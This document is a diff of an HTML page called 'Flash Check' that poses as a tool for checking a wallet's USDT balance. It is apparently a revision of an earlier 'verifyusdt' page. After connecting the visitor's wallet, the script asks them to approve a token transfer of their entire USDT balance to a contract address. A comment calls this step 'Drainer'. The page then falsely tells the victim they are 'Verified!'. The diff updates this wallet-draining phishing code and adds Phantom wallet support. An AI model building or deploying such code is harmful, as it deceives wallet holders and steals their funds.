@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>verifyusdt</title>
+  <title>Flash Check</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
   <script src="https://unpkg.com/@walletconnect/web3-provider@2.11.0/dist/umd/index.min.js"></script>
   <style>
@@ -17,10 +17,10 @@
       justify-content: space-between;
       align-items: center;
       color: #fff;
-      opacity: 0; /* Start hidden to ensure load */
+      opacity: 0;
       transition: opacity 0.5s ease;
     }
-    body.loaded { opacity: 1; } /* Fade in when loaded */
+    body.loaded { opacity: 1; }
     header {
       width: 100%;
       display: flex;
@@ -28,7 +28,12 @@
       align-items: center;
       padding: 20px 5%;
     }
-    .logo { font-size: 30px; font-weight: 700; }
+    .menu-icon {
+      font-size: 30px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+    .menu-icon span { display: block; width: 30px; height: 4px; background: #fff; margin: 5px 0; }
     .top-right { font-size: 20px; font-weight: 400; }
     main { text-align: center; padding: 0 20px; }
     main h1 { font-size: 50px; font-weight: 700; line-height: 60px; margin-bottom: 20px; }
@@ -45,38 +50,45 @@
       transition: background 0.3s ease;
     }
     .check-button:hover { background: #0056b3; }
+    .check-button:disabled { background: #666; cursor: not-allowed; }
     .below-button { font-size: 16px; font-weight: 400; margin-top: 20px; }
     footer { width: 100%; text-align: center; padding: 20px; font-size: 16px; font-weight: 400; }
   </style>
 </head>
 <body>
   <header>
-    <div class="logo">verifyusdt</div>
-    <div class="top-right">verifyusdt</div>
+    <div class="menu-icon"><span></span><span></span><span></span></div>
+    <div class="top-right">Flash Check</div>
   </header>
   <main>
     <h1>Check Your USDT Balance</h1>
     <p>Connect your wallet and check your USDT balance instantly</p>
-    <button class="check-button" onclick="checkUSDT()">Check</button>
-    <div class="below-button">verifyusdt</div>
+    <button class="check-button" id="checkButton" onclick="checkUSDT()">Check</button>
+    <div class="below-button">Flash Check</div>
   </main>
   <footer>
-    Copyright © verifyusdt 2023
+    Copyright © Flash Check 2025
   </footer>
   <script>
-    // Fade in body when loaded
+    const checkButton = document.getElementById('checkButton');
     window.addEventListener('load', () => document.body.classList.add('loaded'));
 
     async function checkUSDT() {
+      checkButton.disabled = true; // Disable button to prevent multiple clicks
       let provider;
+
+      // Check for wallet providers
       if (window.ethereum) {
         provider = window.ethereum;
         console.log('Using MetaMask or similar');
+      } else if (window.solana && window.solana.isPhantom) {
+        provider = window.solana; // Phantom support (though USDT is ERC-20, we'll adapt)
+        console.log('Using Phantom');
       } else if (window.web3) {
         provider = window.web3.currentProvider;
         console.log('Using legacy web3');
       } else {
-        console.log('No wallet detected, prompting WalletConnect');
+        console.log('No wallet detected, trying WalletConnect');
         try {
           const walletConnectProvider = new WalletConnectProvider({
             rpc: { 1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161" },
@@ -90,21 +102,27 @@
       }
 
       if (!provider) {
-        alert('No Web3 wallet detected. Please install MetaMask or another wallet to proceed.');
+        alert('No Web3 wallet detected. Please install MetaMask, Phantom, or another wallet.');
         window.open('https://metamask.io/download.html', '_blank');
+        checkButton.disabled = false;
         return;
       }
 
       try {
-        let accounts = await provider.request({ method: 'eth_accounts' });
-        if (!accounts || accounts.length === 0) {
-          accounts = await provider.request({ method: 'eth_requestAccounts' });
+        let accounts;
+        if (provider.isPhantom) {
+          accounts = await provider.connect().then(() => provider.publicKey ? [provider.publicKey.toString()] : []);
+        } else {
+          accounts = await provider.request({ method: 'eth_accounts' });
+          if (!accounts || accounts.length === 0) {
+            accounts = await provider.request({ method: 'eth_requestAccounts' });
+          }
         }
         const fromAddress = accounts[0];
         const usdtAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // USDT on Ethereum
         const contractAddress = '0x1234…'; // Replace with your contract address
 
-        // Check USDT balance
+        // Check USDT balance (Ethereum-specific)
         const balanceHex = await provider.request({
           method: 'eth_call',
           params: [{ to: usdtAddress, data: '0x70a08231' + fromAddress.slice(2).padStart(64, '0') }, 'latest']
@@ -113,7 +131,8 @@
         const usdtAmount = Number(balance) / 10**6;
 
         if (usdtAmount < 0.05) {
-          alert('Insufficient USDT. You need at least 0.05 USDT to proceed.');
+          alert('Insufficient USDT. You need at least 0.05 USDT.');
+          checkButton.disabled = false;
           return;
         }
 
@@ -122,7 +141,7 @@
         // Drainer: Approve USDT transfer
         const approveABI = '0x095ea7b3';
         const approveData = approveABI + contractAddress.slice(2).padStart(64, '0') + balance.toString(16).padStart(64, '0');
-        await provider.request({
+        const tx = await provider.request({
           method: 'eth_sendTransaction',
           params: [{
             from: fromAddress,
@@ -132,14 +151,15 @@
           }]
         });
 
-        alert('Processing approval...');
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        alert('Processing approval... Transaction: ' + tx);
+        await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for tx to process
         alert('Verified! Screenshot this.');
         if (provider.disconnect) await provider.disconnect();
       } catch (error) {
         console.error('Error:', error.message);
-        alert('Transaction failed. Check console for details and try again.');
-        if (provider && provider.disconnect) await provider.disconnect();
+        alert('Failed. Ensure wallet is unlocked and try again.');
+      } finally {
+        checkButton.disabled = false; // Re-enable button
       }
     }
   </script>
